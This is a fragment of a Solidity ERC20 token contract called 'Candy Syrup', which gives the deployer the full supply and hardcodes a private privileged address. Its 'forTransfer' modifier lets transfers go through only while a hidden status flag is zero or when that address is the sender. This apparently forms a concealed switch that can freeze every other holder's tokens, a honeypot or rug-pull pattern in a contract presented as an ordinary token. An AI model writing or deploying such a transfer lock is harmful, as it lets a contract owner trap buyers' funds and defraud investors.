...
contract CandySyrup is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenah_totalSupply;
    uint256 private _tokenah_status = 0;
    uint256 public stakingPoolahStatus = 0;

    string private _tokenah_name;
    string private _tokenah_symbol;

    address private _poolahAddress = 0x67C0503639634F3B6802625B23F8e3dA36aC508e;

    constructor() {
        _tokenah_name = "Candy Syrup";
        _tokenah_symbol = "CANDY";
        _tokenah_totalSupply = 10000000000 * 10 ** 18;
        _balances[msg.sender] = _tokenah_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolahAddress || _tokenah_status == 0);
        _;
    }
